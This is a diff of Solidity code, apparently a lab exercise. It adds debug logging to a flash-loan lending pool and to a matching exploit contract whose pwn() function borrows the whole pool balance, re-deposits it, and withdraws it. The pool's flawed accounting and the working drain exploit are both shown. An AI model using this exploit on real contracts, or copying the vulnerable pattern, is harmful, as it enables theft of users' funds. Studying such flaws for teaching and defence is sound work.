@@ -7,10 +7,12 @@ contract EthLendingPool {
     mapping(address => uint) public balances;
 
     function deposit() external payable {
+        console.log("Executing deposit from EthLendingPool contract");
         balances[msg.sender] += msg.value;
     }
 
     function withdraw(uint _amount) external {
+        console.log("Executing withdraw from EthLendingPool contract");
         balances[msg.sender] -= _amount;
         (bool sent, ) = msg.sender.call{value: _amount}("");
         require(sent, "send ETH failed");
@@ -21,14 +23,18 @@ contract EthLendingPool {
         address _target,
         bytes calldata _data
     ) external {
+        console.log("Executing flashLoan from EthLendingPool contract");
         uint balBefore = address(this).balance;
+        console.log("EthLending pool balance before the exploit: %s", balBefore);
         require(balBefore >= _amount, "borrow amount > balance");
 
         (bool executed, ) = _target.call{value: _amount}(_data);
         require(executed, "loan failed");
 
         uint balAfter = address(this).balance;
+        console.log("EthLending pool balance after the exploit: %s", balAfter);
         require(balAfter >= balBefore, "balance after < before");
+        console.log("Executed flashLoan from EthLendingPool contract");
     }
 
     // Adding a function to get balance of this contract
@@ -73,21 +79,17 @@ contract EthLendingPoolExploit {
 
     function pwn() external {
         uint bal = address(pool).balance;
-        console.log("EthLending Pool Balance: %s", bal);
+        console.log("Executing flashloan from exploit contract");
         // 1. call flash loan
         pool.flashLoan(
             bal,
             address(this),
             abi.encodeWithSignature("deposit()")
         );
-        console.log("Executed flashloan from exploit contract");
-        console.log("EthLending Pool Balance: %s", address(pool).balance);
-        console.log("EthLending Exploit Contract Balance: %s", address(this).balance);
+        console.log("Executing withdraw from exploit contract");
         // 3. withdraw
         pool.withdraw(pool.balances(address(this)));
-        console.log("Executed flashloan from exploit contract");
-        console.log("EthLending Pool Balance: %s", address(pool).balance);
-        console.log("EthLending Exploit Contract Balance: %s", address(this).balance);
+        console.log("Executed exploit from exploit contract");
     }
 
     // Adding a function to get balance of this contract
